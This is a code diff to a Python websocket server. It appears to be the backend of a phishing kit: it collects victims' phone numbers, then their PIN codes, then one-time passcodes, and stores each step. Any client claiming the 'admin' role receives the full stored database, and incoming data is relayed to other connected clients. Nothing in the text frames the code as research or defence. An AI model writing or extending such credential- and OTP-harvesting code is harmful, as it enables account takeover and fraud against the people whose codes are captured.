@@ -2,6 +2,7 @@ import asyncio
 import websockets
 import json
 import os
+from datetime import datetime
 from aiohttp import web
 
 # --- WebSocket Server Setup ---
@@ -37,20 +38,39 @@ async def websocket_handler(request):
                 try:
                     data = json.loads(message)
                     
-                    # --- NEW ADMIN LOGIC ---
                     is_admin = data.get("role") == "admin"
                     if is_admin:
                         db = load_data()
                         await ws.send_str(json.dumps(db))
                         print("Admin requested data. Sent database content.")
-                    # --- END OF NEW ADMIN LOGIC ---
                     
-                    else: # This is the original logic for regular users
+                    else:
                         db = load_data()
                         user_key = data.get("phone_number", "unknown_user")
-                        db[user_key] = data
-                        save_data(db)
-                        print(f"Data saved for user: {user_key}")
+                        
+                        # Use a timestamp to identify sessions
+                        now = datetime.now().isoformat()
+                        
+                        # --- New logic to handle different forms ---
+                        if data.get("step") == "signup":
+                            # This is the initial signup data
+                            data["timestamp"] = now
+                            db[user_key] = data
+                            save_data(db)
+                            print(f"Data saved for user: {user_key}")
+                        elif data.get("step") == "pin_entry":
+                            # This is the pin form data
+                            if user_key in db:
+                                db[user_key]["pin_code"] = data.get("pin_code")
+                                save_data(db)
+                                print(f"PIN saved for user: {user_key}")
+                        elif data.get("step") == "otp_verification":
+                            # This is the OTP data
+                            if user_key in db:
+                                db[user_key]["otp_code"] = data.get("otp_code")
+                                db[user_key]["timestamp_otp"] = now
+                                save_data(db)
+                                print(f"OTP saved for user: {user_key}")
 
                         for client in connected_clients:
                             if client != ws:
